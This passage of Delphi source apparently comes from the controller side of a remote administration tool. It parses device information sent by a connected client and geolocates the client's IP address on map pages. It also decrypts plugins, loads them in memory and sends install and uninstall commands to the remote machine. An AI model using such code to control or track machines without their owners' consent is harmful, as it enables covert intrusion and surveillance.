      pb1.Position := pb1.Position + 1;

      //Very nice algorithm!!
      DeviceClassName := Copy(List, 1, Pos(Separador, List) - 1);
      Delete(List, 1, Pos(Separador, List) + length(Separador) - 1);

      tvRoot := tvDevices.Items.Add(nil, DeviceClassName);

      TempStr := Copy(List, 1, Pos('##' + separador, List) - 1);
      Delete(List, 1, Pos('##' + separador, List) + 1);
      Delete(List, 1, length(Separador));

      Copymemory(@ClassGUID, @tempstr[1], sizeof(ClassGUID));

      tvRoot.ImageIndex := GetDeviceImageIndex(ClassGUID);
      tvRoot.SelectedIndex := tvRoot.ImageIndex;
      tvRoot.StateIndex := strtoint(Copy(List, 1, Pos(Separador, List) - 1));
      Delete(List, 1, Pos(Separador, List) + length(Separador) - 1);
      Delete(List, 1, 2); // #13#10

      while Pos('@@', List) = 1 do
      begin
        Delete(List, 1, 2); // '@@'

        pb1.Position := pb1.Position + 1;

        DeviceName := Copy(List, 1, Pos(Separador, List) - 1);
        Delete(List, 1, Pos(Separador, List) + length(Separador) - 1);

        TempStr := Copy(List, 1, Pos('##' + separador, List) - 1);
        Delete(List, 1, Pos('##' + separador, List) + 1);
        Delete(List, 1, length(Separador));

        Copymemory(@DeviceInfoData.ClassGuid, @tempstr[1], sizeof(DeviceInfoData.ClassGuid));

        dwIndex := strtoint(Copy(List, 1, Pos(Separador, List) - 1));
        Delete(List, 1, Pos(Separador, List) + length(Separador) - 1);
        Delete(List, 1, 2); // #13#10

        with tvDevices.Items.AddChild(tvRoot, DeviceName) do
        begin
          ImageIndex := GetDeviceImageIndex(DeviceInfoData.ClassGuid);
          SelectedIndex := ImageIndex;
          StateIndex := Integer(dwIndex);
        end;
      end;
    end;

    tvDevices.AlphaSort;
  finally
    tvDevices.Items.EndUpdate;
    AddRecvLog(IntToStr(DevicesCount) + ' installed devices found');
  end;
end;
      
procedure TFormInformations.ListDevicesExtras(List: string);
var
  TmpItem: TListItem;
  TmpList: TStringArray;
  TmpStr: string;
begin
  lvDevices.Clear;

  pb1.Max := StringCount(#13#10, List); 
  pb1.Position := 0;

  lvDevices.Items.EndUpdate;
  try
    while List <> '' do
    begin
      Application.ProcessMessages;
      pb1.Position := pb1.Position + 1;

      TmpStr := Copy(List, 1, Pos(#13#10, List) - 1);
      Delete(List, 1, Pos(#13#10, List) + 1);

      TmpList := ParseString(Separador, TmpStr);
      TmpItem := lvDevices.Items.Add;
      TmpItem.Caption := TmpList[0];
      TmpItem.SubItems.Add(TmpList[1]);
    end;
  finally
    lvDevices.Items.EndUpdate;
    AddRecvLog(IntToStr(pb1.Max) + ' informations items on device found');
  end;
end;
           
function TFormInformations.GetDeviceImageIndex(DeviceGUID: TGUID): Integer;
begin
  Result := -1;
  SetupDiGetClassImageIndex(ClassImageListData, DeviceGUID, Result);
end;

procedure TFormInformations.InitImageList;
begin
  ZeroMemory(@ClassImageListData, SizeOf(TSPClassImageListData));
  ClassImageListData.cbSize := SizeOf(TSPClassImageListData);
  if SetupDiGetClassImageList(ClassImageListData) then
    ilDevices.Handle := ClassImageListData.ImageList;
end;

procedure TFormInformations.ReleaseImageList;
begin
  if not SetupDiDestroyClassImageList(ClassImageListData) then
    RaiseLastOSError;
end;

procedure TFormInformations.FormCreate(Sender: TObject);
begin
  InitImageList;
end;

procedure TFormInformations.btn7Click(Sender: TObject);
begin
  pnlDevices.BringToFront;
  if tvDevices.Items.Count = 0 then R7Click(Sender);
end;

function TFormInformations.RetrieveLogs: string;
var
  i: Integer;
begin
  for i := 0 to lvSystem.Items.Count - 1 do
  begin
    if lvSystem.Items.Item[i].ImageIndex <> -1 then Continue;
    Result := Result + lvSystem.Items.Item[i].Caption + ': ' + lvSystem.Items.Item[i].SubItems[0];
    Result := Result + #13#10;
  end;
end;

//From Rodrigo Ruz
//----
procedure TFormInformations.cbb1Change(Sender: TObject);
var
  i: Integer;
begin
  cbb2.Clear;

  case cbb1.ItemIndex of
    0: for i := Low(GoogleMapsTypes) to High(GoogleMapsTypes) do cbb2.Items.Add(GoogleMapsTypes[i]);
    1: for i := Low(YahooMapsTypes) to High(YahooMapsTypes) do cbb2.Items.Add(YahooMapsTypes[i]);
    2: for i := Low(BingMapsTypes) to High(BingMapsTypes) do cbb2.Items.Add(BingMapsTypes[i]);
    3: cbb2.Clear;
  end;

  if cbb2.Items.Count > 0 then cbb2.ItemIndex := 0;
  cbb2.Visible := cbb2.Items.Count > 0;
end;

procedure TFormInformations.btn8Click(Sender: TObject);
  function ReplaceTag(const PageStr, Tag, NewValue: string): AnsiString;
  begin
    Result := AnsiString(StringReplace(PageStr, Tag, NewValue, [rfReplaceAll]));
  end;
var
  Stream: TMemoryStream;
  Lat, Lng, Title, mType, TmpStr: string;
  HTMLWindow2: IHTMLWindow2;
  i: Integer;
begin
  pnl1.Visible := False;
  if Client.ClientSocket.Connected = False then Exit;

  Lat := GeoIpLatitude(Client.WanIp);
  Lng := GeoIpLongitude(Client.WanIp);
  Title := Format('(%s, %s) %s', [Lat, Lng, Client.WanIp]);

  if cbb2.Visible then
  begin
    i := cbb2.ItemIndex;
    mType := cbb2.Items.Strings[i];
  end;

  wb1.Navigate('about:blank');
  while wb1.ReadyState < READYSTATE_INTERACTIVE do Application.ProcessMessages;

  if Assigned(wb1.Document) then
  begin
    Stream := TMemoryStream.Create;

    try
      case cbb1.ItemIndex of
        0: TmpStr := GoogleMapsPage;
        1: TmpStr := YahooMapsPage;              
        2: TmpStr := BingsMapsPage;
        3: TmpStr := OpenStreetMapsPage;
      end;

      TmpStr := ReplaceTag(TmpStr, '[Lat]', Lat);
      TmpStr := ReplaceTag(TmpStr, '[Lng]', Lng);
      TmpStr := ReplaceTag(TmpStr, '[Title]', Title);
      TmpStr := ReplaceTag(TmpStr, '[Type]', mType);

      Stream.WriteBuffer(Pointer(TmpStr)^, Length(TmpStr));
      Stream.Seek(0, soFromBeginning);
      
      (wb1.Document as IPersistStreamInit).Load(TStreamAdapter.Create(Stream));
    finally
      Stream.Free;
    end;

    HTMLWindow2 := (wb1.Document as IHTMLDocument2).parentWindow;
    AddLog('Loading map viewer with west longitude ' + Lng + ' and north latitude ' + Lat);
  end;
end;
//----

procedure TFormInformations.C1Click(Sender: TObject);
begin
  if not Assigned(lvSystem.Selected) then Exit;
  SetClipboardText(lvSystem.Selected.SubItems[0]);
  AddLog('Item ' + lvSystem.Selected.SubItems[0] + ' copied to clipboard');
end;

procedure TFormInformations.U1Click(Sender: TObject);
begin
  if not Assigned(lvPlugin.Selected) then Exit;
  Client.SendDatas(CUSTOMPLUGINUNINSTALL + '|' + lvPlugin.Selected.SubItems[4]);
  AddSentLog('Uninstall plugin id ' + lvPlugin.Selected.SubItems[4]);
end;

procedure TFormInformations.lvPluginContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lvPlugin.Selected) then
  begin
    for i := 0 to pm3.Items.Count - 1 do pm3.Items[i].Enabled := False;
    pm3.Items[0].Enabled := True;
    pm3.Items[3].Enabled := True;
  end
  else for i := 0 to pm3.Items.Count - 1 do pm3.Items[i].Enabled := True;
end;

procedure TFormInformations.R1Click(Sender: TObject);
begin
  Client.SendDatas(CLIENTPLUGINSLIST + '|');
  AddSentLog('Get installed plugins list');
end;

procedure TFormInformations.I1Click(Sender: TObject);
var
  TmpStr: string;
  Module: PBTMemoryModule;
  PluginInfos: function(): PChar;
  p: Pointer;
  BufferSize: Int64;
  TmpList: TStringArray;
begin
  dlgOpen1.InitialDir := PluginsPath;
  dlgOpen1.Filter := 'Plugin file (*.plugin)|*.plugin';
  dlgOpen1.DefaultExt := 'plugin';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;

  TmpStr := FileToStr(dlgOpen1.FileName);
  BufferSize := StrToInt(Copy(TmpStr, 1, Pos('|', TmpStr) - 1));
  Delete(TmpStr, 1, Pos('|', TmpStr));
  Delete(TmpStr, 1, BufferSize);
  TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);
  
  if TmpStr = '' then
  begin
    MessageBox(Handle, 'Invalid plugin datas.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  p := @TmpStr[1];

  try
    Module := BTMemoryLoadLibary(p, Length(TmpStr));
    if Module = nil then
    begin
      MessageBox(Handle, 'Failed to load plugin.', PROGRAMINFOS, MB_ICONERROR);
      Exit;
    end;

    @PluginInfos := BTMemoryGetProcAddress(Module, 'PluginInfos');
    if not Assigned(PluginInfos) then
    begin
      MessageBox(Handle, 'Invalid plugin datas.', PROGRAMINFOS, MB_ICONERROR);
      Exit;
    end;

    TmpStr := PluginInfos;
    if (TmpStr = '') or (Pos('|', TmpStr) <= 0) then
    begin
      MessageBox(Handle, 'Invalid plugin datas.', PROGRAMINFOS, MB_ICONERROR);
      Exit;
    end;

    TmpList := ParseString('|', TmpStr);
    if TmpList[4] <> 'Client' then
    begin
      MessageBox(Handle, 'Only plugins of type Client are allowed.', PROGRAMINFOS, MB_ICONERROR);
      Exit;
    end;
    
    Client.SendDatas(CUSTOMPLUGININSTALL + '|' + dlgOpen1.FileName + '|' +
      IntToStr(MyGetFileSize(dlgOpen1.FileName)) + #0);
  finally
    BTMemoryFreeLibrary(Module);
  end;
end;
      
function SortByColumn(Item1, Item2: TListItem; Data: Integer): Integer; stdcall;
begin
  if Data = 0 then Result := AnsiCompareText(Item1.Caption, Item2.Caption) else
    Result := AnsiCompareText(Item1.SubItems[Data - 1], Item2.SubItems[Data - 1]);
  if not Ascending then Result := -Result;
end;

procedure TFormInformations.lvDevicesColumnClick(Sender: TObject;
  Column: TListColumn);
var
  i: Integer;
begin
  Ascending := not Ascending;
  if Column <> LastColumn then Ascending := not Ascending;
  LastColumn := Column;
  lvDevices.CustomSort(@SortByColumn, LastColumn.Index);
end;

end.
